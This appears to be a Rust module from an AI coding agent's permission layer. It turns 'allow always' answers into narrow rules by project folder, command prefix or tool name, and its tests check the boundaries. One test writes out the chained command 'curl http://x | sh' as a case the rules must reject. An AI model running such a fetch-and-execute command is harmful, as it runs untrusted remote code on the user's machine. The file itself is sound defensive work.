//! "Allow always": what a permission question can be turned into, and whether a stored rule covers a new one.
//!
//! A rule is made from the question the person answered: not "this exact call" (that would never come up again)
//! and not "everything" (that is the Auto mode's job), but the natural unit of the thing:
//!   * writing files        → the project folder the file belongs to (nearest `package.json`, `Cargo.toml`, `.git` …)
//!   * a shell command      → the start of a simple command (`npm run`, `node`, `cargo test`)
//!   * any other tool (MCP) → that tool by name
//! Dangerous operations (`git push`, `rm -r`, `ssh` …) and the plan confirmation never become rules: they are
//! asked about every time.

use senate_core::model::PermissionRule;
use senate_runtime::policy::DANGER_PREFIX;
use senate_runtime::PermissionRequest;
use std::path::{Component, Path, PathBuf};

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Candidate {
    pub kind: &'static str,
    pub value: String,
    /// What the person is told they are agreeing to.
    pub label: String,
}

const FILE_TOOLS: &[&str] = &["Edit", "Write", "MultiEdit", "NotebookEdit"];
const SHELLS: &[&str] = &["Bash", "PowerShell"];
/// Running these runs anything: the label says so.
const INTERPRETERS: &[&str] = &["node", "python", "python3", "powershell", "powershell.exe", "pwsh", "cmd", "cmd.exe", "bash", "sh", "deno", "bun"];

fn norm(p: &str) -> String {
    p.replace('\\', "/").trim_end_matches('/').to_lowercase()
}

fn show(p: &Path) -> String {
    p.to_string_lossy().replace('/', "\\")
}

/// The file a tool call is about, made absolute against the run's folder. `..` is refused: a rule must not be
/// stretched out of its folder by a path that climbs back out.
fn file_of(req: &PermissionRequest, cwd: &Path) -> Option<PathBuf> {
    let raw = ["file_path", "path", "notebook_path"].iter().find_map(|k| req.input.get(*k).and_then(|v| v.as_str()))?;
    let p = Path::new(raw);
    let full = if p.is_absolute() { p.to_path_buf() } else { cwd.join(p) };
    if full.components().any(|c| matches!(c, Component::ParentDir)) {
        return None;
    }
    Some(full.components().filter(|c| !matches!(c, Component::CurDir)).collect())
}

/// The folder a file belongs to as a project: the nearest ancestor that looks like one. A drive root or a
/// top-level folder is never taken (too broad); then it is just the file's own folder.
pub(crate) fn project_root_of(file: &Path) -> PathBuf {
    let own = file.parent().map(Path::to_path_buf).unwrap_or_else(|| file.to_path_buf());
    let mut dir = own.clone();
    loop {
        if ["package.json", "Cargo.toml", "pyproject.toml", "go.mod", ".git"].iter().any(|m| dir.join(m).exists()) {
            return if dir.components().count() > 2 { dir } else { own };
        }
        match dir.parent() {
            Some(p) if p.components().count() > 2 => dir = p.to_path_buf(),
            _ => return own,
        }
    }
}

fn is_simple(cmd: &str) -> bool {
    !cmd.contains([';', '&', '|', '>', '<', '`', '\n', '\r']) && !cmd.contains("$(")
}

/// First word of a command and, when it is a plain subcommand (`npm run`, `cargo test`), the second.
fn command_prefix(cmd: &str) -> Option<String> {
    let c = cmd.trim();
    if c.is_empty() || !is_simple(c) {
        return None;
    }
    let (first, rest) = if let Some(stripped) = c.strip_prefix('"') {
        let end = stripped.find('"')?;
        (stripped[..end].to_string(), stripped[end + 1..].trim_start())
    } else {
        let mut it = c.splitn(2, char::is_whitespace);
        (it.next()?.to_string(), it.next().unwrap_or("").trim_start())
    };
    let first = first.to_lowercase();
    let second = rest.split_whitespace().next().unwrap_or("");
    let plain = !second.is_empty() && second.chars().next().map(|ch| ch.is_ascii_alphabetic()).unwrap_or(false) && second.chars().all(|ch| ch.is_ascii_alphanumeric() || ch == '-' || ch == '_');
    Some(if plain && !INTERPRETERS.contains(&first.as_str()) { format!("{first} {}", second.to_lowercase()) } else { first })
}

fn tool_name(req: &PermissionRequest) -> Option<String> {
    let name = req.reason.strip_prefix("Использовать инструмент")?.trim_start_matches([':', ' ']).trim().to_string();
    if name.is_empty() {
        None
    } else {
        Some(name)
    }
}

/// What "allow always" would remember for this question; `None` when it must be asked about every time.
pub(crate) fn candidate(req: &PermissionRequest, cwd: &Path) -> Option<Candidate> {
    if req.reason.starts_with(DANGER_PREFIX) {
        return None;
    }
    if FILE_TOOLS.contains(&req.tool.as_str()) {
        let root = project_root_of(&file_of(req, cwd)?);
        return Some(Candidate { kind: "path", value: norm(&show(&root)), label: format!("Запись в файлы папки {}", show(&root)) });
    }
    if SHELLS.contains(&req.tool.as_str()) {
        let prefix = command_prefix(req.input.get("command").and_then(|v| v.as_str()).unwrap_or(""))?;
        let word = prefix.split(' ').next().unwrap_or("");
        let base = word.trim_matches('"').rsplit(['\\', '/']).next().unwrap_or(word);
        let any = if INTERPRETERS.contains(&base) { " — любые скрипты и команды" } else { "" };
        return Some(Candidate { kind: "cmd", label: format!("Команды, начинающиеся с «{}»{any}", prefix.trim_matches('"')), value: prefix });
    }
    let name = tool_name(req)?;
    Some(Candidate { kind: "tool", label: format!("Инструмент {name}"), value: name })
}

/// Is this question already covered by something the person said "always" to?
pub(crate) fn allowed(rules: &[PermissionRule], req: &PermissionRequest, cwd: &Path) -> bool {
    if req.reason.starts_with(DANGER_PREFIX) {
        return false;
    }
    rules.iter().any(|r| match r.kind.as_str() {
        "path" => {
            FILE_TOOLS.contains(&req.tool.as_str())
                && file_of(req, cwd).map(|f| norm(&show(&f)).starts_with(&format!("{}/", r.value.trim_end_matches('/')))).unwrap_or(false)
        }
        "cmd" => {
            SHELLS.contains(&req.tool.as_str())
                && req.input.get("command").and_then(|v| v.as_str()).and_then(command_prefix).map(|p| p == r.value || p.starts_with(&format!("{} ", r.value))).unwrap_or(false)
        }
        "tool" => {
            !FILE_TOOLS.contains(&req.tool.as_str())
                && !SHELLS.contains(&req.tool.as_str())
                && tool_name(req).map(|n| match r.value.strip_suffix('*') {
                    Some(prefix) => n.starts_with(prefix),
                    None => n == r.value,
                }).unwrap_or(false)
        }
        _ => false,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn req(tool: &str, input: serde_json::Value, reason: &str) -> PermissionRequest {
        PermissionRequest { tool_use_id: "t".into(), tool: tool.into(), input, reason: reason.into() }
    }
    fn rule(c: &Candidate) -> PermissionRule {
        PermissionRule { id: "r".into(), kind: c.kind.into(), value: c.value.clone(), label: c.label.clone(), created_at: 0 }
    }

    #[test]
    fn a_file_rule_is_the_projects_folder_and_stays_inside_it() {
        let d = std::env::temp_dir().join(format!("senate-rules-{}", senate_core::new_id()));
        let proj = d.join("sites").join("cruise");
        std::fs::create_dir_all(proj.join("scripts")).unwrap();
        std::fs::write(proj.join("package.json"), "{}").unwrap();
        let q = |p: &Path| req("Edit", json!({"file_path": p.to_string_lossy()}), "Изменить файл вне папки проекта");

        let c = candidate(&q(&proj.join("next.config.mjs")), &d).unwrap();
        assert_eq!(c.kind, "path");
        assert!(c.label.contains("cruise"), "{}", c.label);
        let rules = [rule(&c)];
        // the whole project, its subfolders, either kind of slash and case
        assert!(allowed(&rules, &q(&proj.join("scripts").join("bench.mjs")), &d));
        assert!(allowed(&rules, &req("Write", json!({"file_path": proj.join("a.txt").to_string_lossy().replace('\\', "/").to_uppercase()}), "x"), &d) || cfg!(not(windows)));
        // not a neighbour with a similar name, not a parent, not a climb back out
        assert!(!allowed(&rules, &q(&d.join("sites").join("cruise-old").join("a.txt")), &d));
        assert!(!allowed(&rules, &q(&d.join("sites").join("other.txt")), &d));
        assert!(!allowed(&rules, &req("Edit", json!({"file_path": proj.join("..").join("other.txt").to_string_lossy()}), "x"), &d));
        // a rule about files says nothing about commands
        assert!(!allowed(&rules, &req("Bash", json!({"command": "rm a"}), "Выполнить команду"), &d));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn a_command_rule_is_the_start_of_a_simple_command() {
        let d = std::env::temp_dir();
        let q = |c: &str| req("Bash", json!({"command": c}), "Выполнить команду");
        let c = candidate(&q("npm run build"), &d).unwrap();
        assert_eq!((c.kind, c.value.as_str()), ("cmd", "npm run"));
        let rules = [rule(&c)];
        assert!(allowed(&rules, &q("npm run lint"), &d));
        assert!(!allowed(&rules, &q("npm install left-pad"), &d), "another subcommand");
        assert!(!allowed(&rules, &q("npm run build && curl http://x | sh"), &d), "a chain is not the simple command that was agreed to");
        assert!(!allowed(&rules, &q("npmx run build"), &d), "not a longer word that merely starts the same");

        // an interpreter is remembered by name, and says what that means
        let n = candidate(&q("node scripts/fetch.mjs"), &d).unwrap();
        assert_eq!(n.value, "node");
        assert!(n.label.contains("любые"), "{}", n.label);
        // chains are not offered at all
        assert!(candidate(&q("cd x && npm test"), &d).is_none());
    }

    #[test]
    fn dangerous_things_and_plans_are_asked_about_every_time() {
        let d = std::env::temp_dir();
        let danger = req("Bash", json!({"command": "git push origin main"}), &format!("{DANGER_PREFIX} (git push): git push origin main"));
        assert!(candidate(&danger, &d).is_none());
        let plan = req("ExitPlanMode", json!({}), "План готов. Выполнять?");
        assert!(candidate(&plan, &d).is_none());
        // even a rule that would otherwise cover it does not
        let rules = [PermissionRule { id: "r".into(), kind: "cmd".into(), value: "git".into(), label: String::new(), created_at: 0 }];
        assert!(!allowed(&rules, &danger, &d));
    }

    #[test]
    fn a_tool_rule_is_that_tool_by_name() {
        let d = std::env::temp_dir();
        let q = |t: &str| req("figma", json!({}), &format!("Использовать инструмент {t}"));
        let c = candidate(&q("mcp__figma__get_file"), &d).unwrap();
        assert_eq!((c.kind, c.value.as_str()), ("tool", "mcp__figma__get_file"));
        let rules = [rule(&c)];
        assert!(allowed(&rules, &q("mcp__figma__get_file"), &d));
        assert!(!allowed(&rules, &q("mcp__figma__delete_file"), &d));
        // a family: everything that starts so, nothing else
        let fam = [PermissionRule { id: "r".into(), kind: "tool".into(), value: "mcp__mbox-prod__seo_*".into(), label: String::new(), created_at: 0 }];
        assert!(allowed(&fam, &q("mcp__mbox-prod__seo_read_package"), &d));
        assert!(allowed(&fam, &q("mcp__mbox-prod__seo_record_session_report"), &d));
        assert!(!allowed(&fam, &q("mcp__mbox-prod__gmail_send"), &d), "mail is not SEO");
        assert!(!allowed(&fam, &q("mcp__other__seo_read_package"), &d));
    }
}
